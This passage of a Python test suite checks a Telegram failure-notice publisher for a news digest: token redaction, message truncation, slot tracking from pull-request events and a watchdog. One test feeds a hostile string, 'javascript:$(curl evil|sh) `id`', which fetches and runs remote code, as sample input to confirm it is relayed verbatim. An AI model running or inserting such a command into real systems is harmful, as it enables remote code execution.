        self.assertEqual(len(telegram.zaprosy), 1)

    def test_lyuboe_isklyuchenie_bez_tokena_i_v_trassirovke(self):
        for oshibka in (http.client.InvalidURL(f"URL can't contain control characters. '/bot{LOZHNYY}/sendMessage'"),
                        RuntimeError(f"что-то {LOZHNYY}"), KeyError(LOZHNYY)):
            with self.subTest(oshibka=type(oshibka).__name__):
                rez, _, _ = self.otpravit(oshibka)
                self.assertIsInstance(rez, publikaciya.OshibkaTelegram)
                self.assertNotIn(LOZHNYY, str(rez))
                self.assertIn(type(oshibka).__name__, str(rez))
                self.assertNotIn(LOZHNYY, "".join(traceback.format_exception(rez)))

    def test_ne_json_otvet(self):
        rez, _, _ = self.otpravit(["не", "словарь"])
        self.assertIsInstance(rez, publikaciya.OshibkaTelegram)


class SbojINesohraneno(unittest.TestCase):
    """`sboj --prichina-iz` и `nesohraneno` через точку входа; отправка — подменённый urlopen."""

    def setUp(self):
        papka = nastrojki.KOREN / "temp"
        papka.mkdir(exist_ok=True)
        self._papka = tempfile.TemporaryDirectory(dir=papka)
        self.papka = Path(self._papka.name)
        for zaplatka in (mock.patch.dict(os.environ, {PEREMENNAYA: LOZHNYY}),
                         mock.patch.object(nastrojki, "FAYL_SEKRETOV", self.papka / "sekrety"),
                         mock.patch.object(publikaciya, "seychas", return_value=SEYCHAS)):
            zaplatka.start()
            self.addCleanup(zaplatka.stop)
        self.addCleanup(self._papka.cleanup)

    def komanda(self, *argumenty):
        telegram = Telegram()
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err), \
                mock.patch("urllib.request.urlopen", side_effect=telegram):
            kod = tochka.main(list(argumenty))
        return kod, telegram, err.getvalue()

    def prichina(self, tekst: str) -> str:
        put = self.papka / "prichina.txt"
        put.write_text(tekst, encoding="utf-8")
        return str(put)

    def test_sboj_pervaya_stroka_fayla_bez_parse_mode(self):
        put = self.prichina("адрес не http(s): javascript:$(curl evil|sh) `id`\nвторая строка\n")
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", put)
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{
            "chat_id": KANAL, "text": "выпуск 09:00 не собран: адрес не http(s): javascript:$(curl evil|sh) `id`"}])

    def test_sboj_prichina_do_200_znakov(self):
        kod, telegram, _ = self.komanda("sboj", "--prichina-iz", self.prichina("я" * 250 + "\n"))
        self.assertEqual(kod, 0)
        self.assertEqual(telegram.tela()[0]["text"], "выпуск 09:00 не собран: " + "я" * 200)

    def test_sboj_pustoy_fayl_i_net_fayla(self):
        self.assertEqual(self.komanda("sboj", "--prichina-iz", self.prichina("\n"))[0], 2)
        self.assertEqual(self.komanda("sboj", "--prichina-iz", str(self.papka / "netu.txt"))[0], 2)

    def test_sboj_bez_fayla_prichiny_ne_prinimaetsya(self):
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit) as e:
            tochka.main(["sboj", "причина аргументом"])
        self.assertEqual(e.exception.code, 2)

    def test_nesohraneno(self):
        kod, telegram, err = self.komanda("nesohraneno")
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{
            "chat_id": KANAL, "text": "состояние не сохранено — следующий выпуск может повторить новости"}])

    def test_nesohraneno_oshibka_otpravki_kod_1(self):
        telegram = Telegram(http_oshibka(403, {"ok": False, "error_code": 403, "description": "Forbidden"}))
        with contextlib.redirect_stderr(io.StringIO()), mock.patch("urllib.request.urlopen", side_effect=telegram):
            self.assertEqual(publikaciya.nesohraneno(), 1)


SOBYTIE = Path(__file__).resolve().parent / "proverka" / "sobytie.json"


class SbojSlotIzZayavki(unittest.TestCase):
    """`sboj --prichina-iz <файл> --slot-iz-zayavki <event.json>`: слот открытия заявки — в строку и в
    posledniy_slot, posledniy_sbor не меняется. Часы публикатора — 17:30 по Бангкоку, чтобы слот шёл
    из события, а не из часов."""

    komanda = SbojINesohraneno.komanda
    prichina = SbojINesohraneno.prichina

    def setUp(self):
        SbojINesohraneno.setUp(self)
        zaplatka = mock.patch.object(publikaciya, "seychas",
                                     return_value=datetime(2026, 11, 11, 10, 30, tzinfo=timezone.utc))
        zaplatka.start()
        self.addCleanup(zaplatka.stop)
        self.sost = self.papka / "sostoyanie.json"
        zaplatka = mock.patch.dict(os.environ, {"NEWSAI_SOSTOYANIE": str(self.sost)})
        zaplatka.start()
        self.addCleanup(zaplatka.stop)
        self.prezhnee = {"posledniy_sbor": "2026-11-10T18:07:00Z", "posledniy_slot": "2026-11-10T10:00:00Z",
                         "github_obhod": True, "vidennye": {"https://a/1": "2026-11-10T20:00:00Z"},
                         "opublikovannye": []}
        self.sost.write_text(json.dumps(self.prezhnee), encoding="utf-8")

    def test_slot_zayavki_bez_sdviga_perioda(self):
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"),
                                          "--slot-iz-zayavki", str(SOBYTIE))
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                            "text": "выпуск 09:00 не собран: сбор публикатора не удался"}])
        self.assertEqual(json.loads(self.sost.read_text(encoding="utf-8")),
                         {**self.prezhnee, "posledniy_slot": "2026-11-11T02:00:00Z"})

    def test_bez_sostoyaniya_pishet_tolko_slot(self):
        self.sost.unlink()
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("заявка не прошла проверку: схема\n"),
                                          "--slot-iz-zayavki", str(SOBYTIE))
        self.assertEqual(kod, 0, err)
        self.assertEqual(len(telegram.tela()), 1)
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual((sost["posledniy_slot"], sost["posledniy_sbor"]), ("2026-11-11T02:00:00Z", None))

    def test_sobytie_bez_vremeni_stroka_uhodit_slot_ne_pishetsya(self):
        bez = self.papka / "sobytie.json"
        dannye = json.loads(SOBYTIE.read_text(encoding="utf-8"))
        del dannye["pull_request"]["created_at"]
        for soderzhimoe in (json.dumps(dannye), "не json"):
            with self.subTest(soderzhimoe=soderzhimoe[:10]):
                bez.write_text(soderzhimoe, encoding="utf-8")
                kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"),
                                                  "--slot-iz-zayavki", str(bez))
                self.assertEqual(kod, 0, err)
                self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                                    "text": "выпуск 17:00 не собран: сбор публикатора не удался"}])
                self.assertIn("слот не записан", err)
                self.assertEqual(json.loads(self.sost.read_text(encoding="utf-8")), self.prezhnee)

    def test_stroka_ne_ushla_slot_vse_ravno_pishetsya(self):
        telegram = Telegram(http_oshibka(403, {"ok": False, "error_code": 403, "description": "Forbidden"}))
        with contextlib.redirect_stderr(io.StringIO()), mock.patch("urllib.request.urlopen", side_effect=telegram):
            kod = publikaciya.sboj_iz_fayla(Path(self.prichina("сбор публикатора не удался\n")), sobytie=SOBYTIE)
        self.assertEqual(kod, 1)
        self.assertEqual(sostoyanie.zagruzit(self.sost)["posledniy_slot"], "2026-11-11T02:00:00Z")

    def test_sostoyanie_ne_chitaetsya_stroka_uhodit_kod_1(self):
        self.sost.write_text("{", encoding="utf-8")
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"),
                                          "--slot-iz-zayavki", str(SOBYTIE))
        self.assertEqual(kod, 1)
        self.assertEqual(len(telegram.tela()), 1)
        self.assertIn("слот не записан", err)
        self.assertEqual(self.sost.read_text(encoding="utf-8"), "{")

    def test_bez_flaga_sostoyanie_ne_trogaetsya(self):
        kod, _, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"))
        self.assertEqual(kod, 0, err)
        self.assertEqual(json.loads(self.sost.read_text(encoding="utf-8")), self.prezhnee)


def zayavka_rest(vetka="claude/vypusk-2026-11-11T02-07-00Z", sozdana="2026-11-11T02:15:00Z",
                 repo="egor/news-ai", baza="egor/news-ai") -> dict:
    """Заявка в виде ответа REST GitHub pulls."""
    return {"number": 7, "state": "closed", "created_at": sozdana,
            "head": {"ref": vetka, "repo": {"full_name": repo}}, "base": {"ref": "main", "repo": {"full_name": baza}}}


class Storozh(unittest.TestCase):
    """`storozh --zayavki <файл>`: время — 09:20 по Бангкоку, слот 09:00 = 02:00 UTC."""

    komanda = SbojINesohraneno.komanda

    def setUp(self):
        SbojINesohraneno.setUp(self)
        self.sostoyanie = self.papka / "sostoyanie.json"
        zaplatka = mock.patch.dict(os.environ, {"NEWSAI_SOSTOYANIE": str(self.sostoyanie)})
        zaplatka.start()
        self.addCleanup(zaplatka.stop)

    def zapusk(self, zayavki, posledniy_slot=None):
        if posledniy_slot is not None:
            self.sostoyanie.write_text(json.dumps({"posledniy_slot": posledniy_slot}), encoding="utf-8")
        put = self.papka / "zayavki.json"
        put.write_text(json.dumps(zayavki), encoding="utf-8")
        return self.komanda("storozh", "--zayavki", str(put))

    def test_net_ni_slota_ni_zayavki_stroka_sboya(self):
        kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-10T18:00:00Z")
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": "выпуск 09:00 не собран: заявка агента не пришла"}])

    def test_pervyy_raz_bez_sostoyaniya_tozhe_stroka(self):
        kod, telegram, err = self.zapusk([])
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": "выпуск 09:00 не собран: заявка агента не пришла"}])

    def test_slot_obrabotan_molchit(self):
        kod, telegram, err = self.zapusk([], posledniy_slot="2026-11-11T02:00:00Z")
        self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_vcherashniy_tot_zhe_chas_ne_schitaetsya(self):
        kod, telegram, _ = self.zapusk([], posledniy_slot="2026-11-10T02:00:00Z")
        self.assertEqual(len(telegram.tela()), 1)

    def test_zayavka_k_slotu_est_molchit(self):
        kod, telegram, err = self.zapusk([zayavka_rest()], posledniy_slot="2026-11-10T18:00:00Z")
        self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_ne_ta_zayavka_ne_zaglushaet(self):
        for z in (zayavka_rest(sozdana="2026-11-11T01:59:59Z"),
                  zayavka_rest(vetka="fix/kod"),
                  zayavka_rest(repo="chuzhoy/news-ai")):
            with self.subTest(z=z):
                kod, telegram, err = self.zapusk([z], posledniy_slot="2026-11-10T18:00:00Z")
                self.assertEqual(kod, 0, err)
                self.assertEqual(len(telegram.tela()), 1)

    def test_zayavka_posle_okna_ne_zaglushaet(self):
        with mock.patch.object(publikaciya, "seychas",
                               return_value=datetime(2026, 11, 11, 2, 40, tzinfo=timezone.utc)):
            kod, telegram, err = self.zapusk([zayavka_rest(sozdana="2026-11-11T02:40:00Z")],
                                             posledniy_slot="2026-11-10T18:00:00Z")
            self.assertEqual(kod, 0, err)
            self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                                "text": "выпуск 09:00 не собран: заявка агента не пришла"}])
            kod, telegram, err = self.zapusk([zayavka_rest(sozdana="2026-11-11T02:39:59Z")],
                                             posledniy_slot="2026-11-10T18:00:00Z")
            self.assertEqual((kod, telegram.tela()), (0, []), err)

    def test_spisok_zayavok_ne_chitaetsya_kod_2_bez_otpravki(self):
        put = self.papka / "zayavki.json"
        put.write_text("{не json", encoding="utf-8")
        kod, telegram, _ = self.komanda("storozh", "--zayavki", str(put))
        self.assertEqual((kod, telegram.tela()), (2, []))


class TekstSboya(unittest.TestCase):
    def test_tekst_so_slotom(self):
        kogda = datetime(2026, 11, 11, 18, 20, tzinfo=timezone.utc)
        self.assertEqual(publikaciya.tekst_sboya("не ответил ни один источник", kogda),
                         "выпуск 01:00 не собран: не ответил ни один источник")

    def test_dlinnaya_prichina_obrezaetsya(self):
        self.assertEqual(publikaciya.dlina(publikaciya.tekst_sboya("я" * 5000)), 4096)


if __name__ == "__main__":
    unittest.main()
